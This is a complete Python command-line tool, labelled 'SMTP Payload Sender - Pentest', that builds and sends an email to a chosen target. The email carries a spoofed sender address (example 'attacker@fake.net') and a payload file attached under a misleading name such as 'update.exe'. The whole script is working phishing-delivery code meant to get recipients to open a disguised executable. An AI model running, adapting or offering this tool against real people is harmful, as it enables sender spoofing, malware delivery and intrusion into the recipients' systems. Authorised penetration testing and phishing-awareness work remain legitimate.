#!/usr/bin/env python3
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import sys
import os
import time

def colored_print(message, type="info"):
    colors = {
        "error": "\033[91m",   # Red
        "success": "\033[92m",  # Green
        "info": "\033[94m",    # Blue
        "warning": "\033[93m",  # Yellow
        "reset": "\033[0m"     # Reset
    }
    print(f"{colors.get(type, colors['info'])}{message}{colors['reset']}")

def get_user_input(message, required=True):
    while True:
        value = input(message).strip()
        if value or not required:
            return value
        colored_print("This field cannot be empty! Please try again.", "error")

def check_file(file_path):
    if not os.path.exists(file_path):
        colored_print(f"Error: {file_path} not found!", "error")
        return False
    return True

def create_email():
    colored_print("\n=== Email Configuration ===", "info")
    
    from_addr = get_user_input("Sender Email [ex: attacker@fake.net]: ")
    to_addr = get_user_input("Target Email: ")
    subject = get_user_input("Email Subject: ")
    
    colored_print("\nEnter email content (press CTRL+D or empty line to finish):", "info")
    body_lines = []
    try:
        while True:
            line = input()
            if not line:
                break
            body_lines.append(line)
    except EOFError:
        pass
    
    body = "\n".join(body_lines)
    
    while True:
        payload_path = get_user_input("\nPayload file path: ")
        if check_file(payload_path):
            break
    
    fake_filename = get_user_input("Fake filename for payload [ex: update.exe]: ")

    try:
        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with open(payload_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {fake_filename}')
            msg.attach(part)

        return msg, from_addr, to_addr

    except Exception as e:
        colored_print(f"Error creating email: {str(e)}", "error")
        sys.exit(1)

def send_email(msg, from_addr, to_addr):
    colored_print("\n=== SMTP Server Configuration ===", "info")
    
    smtp_server = get_user_input("SMTP Server Address: ")
    port = int(get_user_input("SMTP Port [default: 25]: ") or "25")

    try:
        colored_print("\nEstablishing connection...", "info")
        time.sleep(1)  # Small delay for better user experience
        
        s = smtplib.SMTP(smtp_server, port)
        colored_print(f"[+] Connected to {smtp_server}:{port}", "success")

        colored_print("Sending email...", "info")
        time.sleep(1)
        
        s.sendmail(from_addr, to_addr, msg.as_string())
        colored_print(f"[+] Email successfully sent to: {to_addr}", "success")

        s.quit()
        colored_print("[+] SMTP connection closed", "success")

    except Exception as e:
        colored_print(f"Error sending email: {str(e)}", "error")
        sys.exit(1)

def main():
    try:
        colored_print("""
╔═══════════════════════════════════════╗
║     SMTP Payload Sender - Pentest     ║
╚═══════════════════════════════════════╝
""", "info")
        
        msg, from_addr, to_addr = create_email()
        
        confirm = get_user_input("\nSend the email? (Y/n): ").lower()
        if confirm != 'n':
            send_email(msg, from_addr, to_addr)
        else:
            colored_print("Operation cancelled.", "warning")

    except KeyboardInterrupt:
        print("\n")
        colored_print("Program terminated by user.", "warning")
        sys.exit(0)

if __name__ == "__main__":
    main()
